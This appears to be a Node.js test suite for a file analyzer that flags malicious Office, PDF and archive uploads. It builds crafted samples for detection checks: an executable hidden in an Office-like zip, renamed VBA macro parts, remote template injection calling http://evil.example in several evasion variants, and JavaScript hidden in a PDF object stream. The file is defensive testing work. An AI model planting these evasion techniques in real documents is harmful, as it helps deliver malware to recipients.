// Checks that crafted files get the expected verdict. Run: node test/analyzer.test.js
const zlib = require("zlib");
const { analyze } = require("../src/analyzer.js");

function zip(files) { // [{name, data(Buffer)}], stored (method 0), no CRC (parser doesn't check it)
  const locals = [], centrals = [];
  let off = 0;
  for (const f of files) {
    const name = Buffer.from(f.name, "utf8");
    const lh = Buffer.alloc(30);
    lh.writeUInt32LE(0x04034b50, 0); lh.writeUInt16LE(20, 4);
    lh.writeUInt32LE(f.data.length, 18); lh.writeUInt32LE(f.data.length, 22); lh.writeUInt16LE(name.length, 26);
    const ch = Buffer.alloc(46);
    ch.writeUInt32LE(0x02014b50, 0);
    ch.writeUInt32LE(f.data.length, 20); ch.writeUInt32LE(f.data.length, 24); ch.writeUInt16LE(name.length, 28);
    ch.writeUInt32LE(off, 42);
    locals.push(lh, name, f.data);
    centrals.push(ch, name);
    off += 30 + name.length + f.data.length;
  }
  const cd = Buffer.concat(centrals);
  const eocd = Buffer.alloc(22);
  eocd.writeUInt32LE(0x06054b50, 0); eocd.writeUInt16LE(files.length, 8); eocd.writeUInt16LE(files.length, 10);
  eocd.writeUInt32LE(cd.length, 12); eocd.writeUInt32LE(off, 16);
  return Buffer.concat([...locals, cd, eocd]);
}
const B = (s) => Buffer.from(s, "latin1");
const CT = '<?xml version="1.0"?><Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"></Types>';
const docx = (extra = [], ct = CT) => zip([{ name: "[Content_Types].xml", data: B(ct) }, { name: "word/document.xml", data: B("<w:document/>") }, ...extra]);
const pdf = (body) => B("%PDF-1.7\n" + body + "\n%%EOF\n");

let failed = 0;
async function check(label, bytes, name, expectVerdict, expectTitle) {
  const t = Date.now();
  let r;
  try { r = await analyze(new Uint8Array(bytes), name); }
  catch (e) { failed++; console.log(`FAIL  ${label}: threw ${e.message}`); return; }
  const titles = r.findings.map((f) => `${f.level}:${f.title}`);
  const ok = r.verdict === expectVerdict && (!expectTitle || titles.some((x) => expectTitle.test(x)));
  if (!ok) failed++;
  console.log(`${ok ? "ok   " : "FAIL "} ${label}: ${r.verdict} (${Date.now() - t} ms)${ok ? "" : "\n        " + titles.join("\n        ")}`);
}

(async () => {
  // regressions: plain files stay clean
  await check("plain docx is clean", docx(), "cv.docx", "clean");
  await check("plain pdf is clean", pdf("1 0 obj\n<< /Type /Catalog >>\nendobj"), "cv.pdf", "clean");
  await check("plain zip with a text file is clean", zip([{ name: "notes.txt", data: B("hi") }]), "notes.zip", "clean");

  // 1. [Content_Types].xml must not hide archive contents
  await check("zip posing as Office with exe inside", zip([{ name: "[Content_Types].xml", data: B(CT) }, { name: "invoice.exe", data: B("MZ") }]), "invoice.zip", "suspicious", /contains executable/);

  // 2. many large streams: must not throw, must report partial inspection
  const big = zlib.deflateSync(Buffer.alloc(8 * 1024 * 1024 + 4096, 0x20));
  const parts = [];
  for (let i = 0; i < 150; i++) parts.push(B(`${i + 1} 0 obj\n<< /Filter /FlateDecode /Length ${big.length} >>\nstream\n`), big, B("\nendstream\nendobj\n"));
  await check("pdf with 150 x 8MB streams", Buffer.concat([B("%PDF-1.7\n"), ...parts, B("%%EOF\n")]), "big.pdf", "caution", /could not be fully inspected/);

  // 3. nesting deeper than one level terminates and is not followed
  const l3 = zip([{ name: "deep.docm", data: docx([{ name: "word/vbaProject.bin", data: B("x") }]) }]);
  const l2 = zip([{ name: "inner.zip", data: l3 }]);
  const l1 = zip([{ name: "outer.zip", data: l2 }]);
  await check("3-level nested zip terminates", l1, "a.zip", "caution", /contains other archives/);
  await check("1-level nested docm is still inspected", zip([{ name: "x.docx", data: docx([{ name: "word/vbaProject.bin", data: B("x") }]) }]), "a.zip", "suspicious", /x\.docx: Contains VBA macros/);

  // 4. encrypted pdf
  await check("encrypted pdf", pdf("trailer\n<< /Encrypt 5 0 R >>"), "cv.pdf", "caution", /PDF is encrypted/);
  await check("encrypted pdf, hex-escaped name", pdf("trailer\n<< /Encr#79pt 5 0 R >>"), "cv.pdf", "caution", /PDF is encrypted/);

  // 5a. macro part under another name, declared in content types / relationships
  const ctMacro = CT.replace("</Types>", '<Override PartName="/word/theme9.bin" ContentType="application/vnd.ms-office.vbaProject"/></Types>');
  await check("renamed macro part (content types)", docx([{ name: "word/theme9.bin", data: B("x") }], ctMacro), "cv.docx", "suspicious", /Contains VBA macros/);
  const relMacro = "<Relationships><Relationship Id='r1' Type='http://schemas.microsoft.com/office/2006/relationships/vbaProject' Target='theme9.bin'/></Relationships>";
  await check("renamed macro part (relationship)", docx([{ name: "word/_rels/document.xml.rels", data: B(relMacro) }]), "cv.docx", "suspicious", /Contains VBA macros/);

  // 5b. template injection with single quotes, entity-encoded TargetMode, namespace prefix, UTF-16
  const tpl = (xml) => docx([{ name: "word/_rels/settings.xml.rels", data: xml }]);
  const T = "http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate";
  await check("template injection, double quotes", tpl(B(`<Relationships><Relationship Type="${T}" Target="http://evil.example/t.dotm" TargetMode="External"/></Relationships>`)), "cv.docx", "suspicious", /template injection/);
  await check("template injection, single quotes", tpl(B(`<Relationships><Relationship Type='${T}' Target='http://evil.example/t.dotm' TargetMode='External'/></Relationships>`)), "cv.docx", "suspicious", /template injection/);
  await check("template injection, entity-encoded + prefix", tpl(B(`<r:Relationships><r:Relationship Type="${T}" Target="http://evil.example/t.dotm" TargetMode="&#69;xternal"/></r:Relationships>`)), "cv.docx", "suspicious", /template injection/);
  await check("template injection, UTF-16", tpl(Buffer.concat([Buffer.from([0xff, 0xfe]), Buffer.from(`<Relationships><Relationship Type="${T}" Target="http://evil.example/t.dotm" TargetMode="External"/></Relationships>`, "utf16le")])), "cv.docx", "suspicious", /template injection/);
  await check("internal relationship is not flagged", tpl(B(`<Relationships><Relationship Type="${T}" Target="t.dotm"/></Relationships>`)), "cv.docx", "clean");

  // 5c. object stream that can't be decoded; js inside a decodable one is still found
  await check("ObjStm with undecodable filter", pdf("7 0 obj\n<< /Type /ObjStm /Filter /ASCIIHexDecode /Length 4 >>\nstream\n2f4a>\nendstream\nendobj"), "cv.pdf", "caution", /can't be inspected/);
  const js = zlib.deflateSync(B("1 0 << /S /JavaScript /JS (app.alert(1)) >>"));
  await check("js inside Flate ObjStm", Buffer.concat([B("%PDF-1.7\n7 0 obj\n<< /Type /ObjStm /Filter /FlateDecode >>\nstream\n"), js, B("\nendstream\nendobj\n%%EOF\n")]), "cv.pdf", "suspicious", /PDF contains JavaScript/);

  // 5d. new dangerous extensions
  await check(".one is flagged", B("x"), "notes.one", "suspicious", /Executable or script file type/);
  await check(".iqy is flagged", B("WEB\n1\nhttp://x"), "data.iqy", "suspicious", /Executable or script file type/);

  console.log(failed ? `\n${failed} check(s) FAILED` : "\nall checks passed");
  process.exit(failed ? 1 : 0);
})();
